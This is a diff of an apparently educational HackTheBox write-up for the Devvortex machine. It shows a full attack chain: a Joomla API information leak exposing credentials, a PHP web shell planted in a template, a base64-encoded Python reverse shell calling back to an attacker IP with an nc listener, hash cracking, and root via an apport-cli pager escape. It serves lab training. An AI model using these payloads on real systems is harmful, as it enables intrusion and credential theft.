@@ -11,13 +11,13 @@ series: Machines
 
 ## Introduction
 
-<p>Devvortex is an "Easy" HTB machine. The following is its description on the platform:</p>
+Devvortex is an "Easy" HTB machine. The following is its description on the platform:
 
 > Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service's configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.
 
 ## First Steps
 
-<p>We can start our enumeration process by running Nmap to identify open ports:</p>
+We can start our enumeration process by running Nmap to identify open ports:
 
 ```bash
 sudo nmap -T4 -p- --open -Pn 10.10.11.242
@@ -32,7 +32,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 35.02 seconds
 ```
 
-<p>There are only two open ports: 22 and 80. We can then run Nmap with some flags to get service banner, service version, etc.</p>
+There are only two open ports: 22 and 80. We can then run Nmap with some flags to get service banner, service version, etc.
 
 ```bash
 sudo nmap -sC -sV -p 22,80 -Pn --open 10.10.11.242
@@ -55,7 +55,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
 ```
 
-<p>We see that there's a redirect to "devvortex.htb" on port 80, so we will add it to our "/etc/hosts" file.</p>
+We see that there's a redirect to "devvortex.htb" on port 80, so we will add it to our "/etc/hosts" file.
 
 ```bash
 cat /etc/hosts
@@ -66,9 +66,9 @@ cat /etc/hosts
 10.10.11.242	devvortex.htb
 ```
 
-<p>After opening the website in a browser, there's not much that could be interesting. We see an email in the footer: "info@DevVortex.htb". We can take note of it in case it is useful later and we move on.</p>
+After opening the website in a browser, there's not much that could be interesting. We see an email in the footer: "info@DevVortex.htb". We can take note of it in case it is useful later and we move on.
 
-<p>Next step would be using Ffuf to look for subdomains:</p>
+Next step would be using Ffuf to look for subdomains:
 
 ```bash
 ffuf -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -w ~/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -ic -fw 4
@@ -98,7 +98,7 @@ ________________________________________________
 dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 85ms]
 ```
 
-<p>It seems like "dev" is a valid subdomain. We will also add it to "/etc/hosts".</p>
+It seems like "dev" is a valid subdomain. We will also add it to "/etc/hosts".
 
 ```bash
 cat /etc/hosts
@@ -109,9 +109,9 @@ cat /etc/hosts
 10.10.11.242	devvortex.htb dev.devvortex.htb
 ```
 
-<p>After accessing the new subdomain, we don't get a lot of information nor a lot of features to interact with. We see the following email address in the footer and take note: "contact@devvortex.htb".</p>
+After accessing the new subdomain, we don't get a lot of information nor a lot of features to interact with. We see the following email address in the footer and take note: "contact@devvortex.htb".
 
-<p>By trying to access "/index.php" we are redirected to the home page, which indicates that the server is running a PHP application. Also, it seems like the website is running on Joomla, which can be verified by accessing its "robots.txt" file:</p>
+By trying to access "/index.php" we are redirected to the home page, which indicates that the server is running a PHP application. Also, it seems like the website is running on Joomla, which can be verified by accessing its "robots.txt" file:
 
 ```bash
 curl http://dev.devvortex.htb/robots.txt
@@ -146,7 +146,7 @@ Disallow: /plugins/
 Disallow: /tmp/
 ```
 
-<p>We can then find Joomla's version with the following command:</p>
+We can then find Joomla's version with the following command:
 
 ```bash
 curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
@@ -162,9 +162,9 @@ curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
 [...snip]
 ```
 
-<p>This version seems to be vulnerable to an unauthenticated information disclosure issue. There's an <a href="https://www.exploit-db.com/exploits/51334">exploit</a> available, but by reading its code we can see that it consists of calls to an API endpoint. We can exploit it with Curl or even rewrite the exploit in a different language if we feel like it. I'll use Curl.</p>
+This version seems to be vulnerable to an unauthenticated information disclosure issue. There's an <a href="https://www.exploit-db.com/exploits/51334">exploit</a> available, but by reading its code we can see that it consists of calls to an API endpoint. We can exploit it with Curl or even rewrite the exploit in a different language if we feel like it. I'll use Curl.
 
-<p>First, we can get information about the users:</p>
+First, we can get information about the users:
 
 ```bash
 curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
@@ -216,7 +216,7 @@ curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
 }
 ```
 
-<p>Then, we can get configuration information:</p>
+Then, we can get configuration information:
 
 ```bash
 curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
@@ -300,11 +300,11 @@ curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=tru
 }
 ```
 
-<p>User "lewis" seems to have the password "P4ntherg0t1n5r3c0n##". We can use it to successfully login to Joomla on "/administrator". We tried to SSH into the machine as well with these credentials but it did not work.</p>
+User "lewis" seems to have the password "P4ntherg0t1n5r3c0n##". We can use it to successfully login to Joomla on "/administrator". We tried to SSH into the machine as well with these credentials but it did not work.
 
-<p>After logging into Joomla, Lewis seems to be part of the super users - which means that we have admin privileges. We can go to "System > Templates > Site Templates > Cassiopeia Details and Files > error.php". We can then add <custom-code>system($_GET['cmd']);</custom-code> to second line of the code and save it.</p>
+After logging into Joomla, Lewis seems to be part of the super users - which means that we have admin privileges. We can go to "System > Templates > Site Templates > Cassiopeia Details and Files > error.php". We can then add `system($_GET['cmd']);` to second line of the code and save it.
 
-<p>To finally achieve remote code execution (RCE), we can run:</p>
+To finally achieve remote code execution (RCE), we can run:
 
 ```bash
 curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=whoami"
@@ -315,32 +315,32 @@ curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=pwd"
 /var/www/dev.devvortex.htb/templates/cassiopeia
 ```
 
-<p>We can check if Python3 is available on the machine:</p>
+We can check if Python3 is available on the machine:
 
 ```bash
 curl -s "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=which+python3"
 /usr/bin/python3
 ```
 
-<p>We can then generate a reverse shell payload with GoPariah:</p>
+We can then generate a reverse shell payload with GoPariah:
 
 ```bash
 gopariah python3_b64 10.10.16.8 9001
 echo -n cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjgiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash
 ```
 
-<p>We URL-encode it and send it in the "cmd" parameter. Before doing it, we should setup a listener so we can catch the reverse shell connection:</p>
+We URL-encode it and send it in the "cmd" parameter. Before doing it, we should setup a listener so we can catch the reverse shell connection:
 
 ```bash
 nc -l 9001
 www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$
 ```
 
-<p>We're in!</p>
+We're in!
 
 ## User Flag
 
-<p>Lewis's credentials can be used to access MySQL:</p>
+Lewis's credentials can be used to access MySQL:
 
 ```bash
 www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##'
@@ -361,7 +361,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 mysql>
 ```
 
-<p>We can get Logan's password hash with the following commands:</p>
+We can get Logan's password hash with the following commands:
 
 ```bash
 mysql> use joomla
@@ -406,7 +406,7 @@ select * from sd4fg_users\G
 [...snip]
 ```
 
-<p>We save it to a file called "hashcrackmepls" and use John The Ripper with the "rockyou.txt" wordlist to crack the hash.</p>
+We save it to a file called "hashcrackmepls" and use John The Ripper with the "rockyou.txt" wordlist to crack the hash.
 
 ```bash
 john --wordlist=Tools/rockyou.txt hashcrackmepls
@@ -422,7 +422,7 @@ tequieromucho    (?)
 [...snip]
 ```
 
-<p>The password is "tequieromucho". We can then log into the machine via SSH and get the "user.txt" flag:</p>
+The password is "tequieromucho". We can then log into the machine via SSH and get the "user.txt" flag:
 
 ```bash
 cat user.txt
@@ -431,7 +431,7 @@ af3dfe6520b8dffe6bdc801d09c0d8fc
 
 ## Root Flag
 
-<p>The first thing we will run after logging into the machine is running "sudo -l". We will get the following output:</p>
+The first thing we will run after logging into the machine is running "sudo -l". We will get the following output:
 
 ```bash
 sudo -l
@@ -442,7 +442,7 @@ User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
 ```
 
-<p>So, Logan can run "/usr/bin/apport-cli" as root. It seems like there's a CVE related to privilege escalation with apport-cli. According to its <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">PoC</a>, we can become rooting by doing the following:</p>
+So, Logan can run "/usr/bin/apport-cli" as root. It seems like there's a CVE related to privilege escalation with apport-cli. According to its <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">PoC</a>, we can become rooting by doing the following:
 
 ```bash
 sudo apport-cli -P 10610 -f
@@ -468,13 +468,13 @@ Please choose (S/V/K/I/C): V
 root@devvortex:/home/logan#
 ```
 
-<p>After choosing "V", a different screen will show up. We can then enter "!/bin/bash" and press enter. We will become root.</p>
+After choosing "V", a different screen will show up. We can then enter "!/bin/bash" and press enter. We will become root.
 
-<p>We can then grab the root flag:</p>
+We can then grab the root flag:
 
 ```bash
 cat /root/root.txt
 6696e021cef172376451650f58ce1dfa
 ```
 
-<p>That's all, folks!</p>
+That's all, folks!
